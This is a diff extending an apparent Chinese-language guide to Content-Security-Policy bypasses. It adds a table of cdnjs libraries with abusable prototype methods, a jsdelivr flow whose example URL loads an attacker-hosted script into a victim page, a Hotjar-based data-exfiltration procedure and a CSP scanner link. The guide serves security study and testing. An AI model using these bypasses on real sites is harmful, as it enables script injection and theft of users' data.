@@ -325,6 +325,24 @@ Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
 </div>
 ```
 
+**2016 年自动化扫描结果**：对 cdnjs 上全部 4290 个库进行 headless 浏览器自动化扫描，发现 **74 个库 (1.72%) 会污染原型链**，其中 **12 个 (16.2%) 满足 CSP 绕过条件**（原型方法 + `.call()` 返回 `window`）：
+
+| 库 | 可滥用方法 |
+|----|-----------|
+| **prototype.js** (1.7.3) | `Function.prototype.curry`, `Array.prototype.clear`, `Number.prototype.times` |
+| **mootools-core** (1.6.0) | `Array.prototype.erase`, `Array.prototype.empty`, `Function.prototype.extend` |
+| **asciidoctor.js** (1.5.9) | `Array.prototype.$push`, `String.prototype.$chomp`, `Function.prototype.$to_proc` |
+| **jquery-ui-bootstrap** (0.5pre/date.js) | `Number.prototype.milliseconds/seconds/minutes/hours/days/weeks/months/years` |
+| **ext-core** (3.1.0) | `Function.prototype.createInterceptor` |
+| **datejs** (1.0) | `Number.prototype.milliseconds` 系列 (同 jquery-ui-bootstrap) |
+| **json-forms** (1.6.3) | `String.prototype.format` |
+| **inheritance-js** (0.4.12) | `Object.prototype.mix`, `Object.prototype.mixDeep` |
+| **melonjs** (1.0.1) | `Array.prototype.remove` |
+| **opal** (0.3.43) | `Array.prototype.$push/$shuffle`, `Function.prototype.$to_proc`, `Number.prototype.$times` |
+| **tmlib.js** (0.5.2) | `Array.prototype.swap/clear/shuffle`, `Number.prototype.times/upto/downto/step` |
+
+自动化扫描工具：[cdnjs-prototype-pollution](https://github.com/aszx87410/cdnjs-prototype-pollution)
+
 **从 className 触发 Angular XSS**：
 
 ```html
@@ -416,6 +434,27 @@ https://www.youtube.com/oembed?callback=alert;
 | Azure Websites | *.azurewebsites.net, *.azurestaticapps.net | 外传 + 执行 |
 | Salesforce Heroku | *.herokuapp.com | 外传 + 执行 |
 | Google Firebase | *.firebaseapp.com | 外传 + 执行 |
+
+**Jsdelivr 代码执行流程**：
+
+若 CSP 白名单包含 `cdn.jsdelivr.net`，攻击者可利用 jsdelivr 的 CDN 缓存机制：
+
+1. 将恶意 JS payload 上传到 **GitHub** 仓库或 **npm** 包
+2. 通过 jsdelivr URL 模式触发缓存：
+   - GitHub：`https://cdn.jsdelivr.net/gh/<user>/<repo>@<version>/<file>`
+   - npm：`https://cdn.jsdelivr.net/npm/<package>@<version>/<file>`
+3. 在目标页面以 `<script src="https://cdn.jsdelivr.net/gh/...">` 加载——CSP 视其为合法来源
+
+```
+https://victim.com/page?source=https://cdn.jsdelivr.net/gh/attacker/payload/exec.js
+```
+
+**Hotjar 数据外传流程**：
+
+1. 注册 Hotjar 账户 → 创建 Poll
+2. 在攻击者控制的页面中回答 Poll，嗅探 HTTP 流量获取请求格式
+3. 在受害者侧模拟该 "Poll answer" 请求，将敏感数据嵌入 Poll 响应
+4. 在 Hotjar Dashboard 中查看窃取数据
 
 **示例：Facebook 数据外传**
 
@@ -1062,6 +1101,7 @@ async function query(word, end=false) {
 - [CSP Evaluator (Google)](https://csp-evaluator.withgoogle.com/) — 检测 CSP 策略中的不安全配置
 - [CSP Validator](https://cspvalidator.org/) — 在线验证 CSP 策略有效性
 - [csper.io CSP Generator](https://csper.io/docs/generating-content-security-policy) — 自动生成 CSP
+- [Dresscode (SensePost)](https://github.com/sensepost/dresscode) — 大规模 CSP 扫描与健康状态分析工具
 
 ### 用户侧检测信号
 
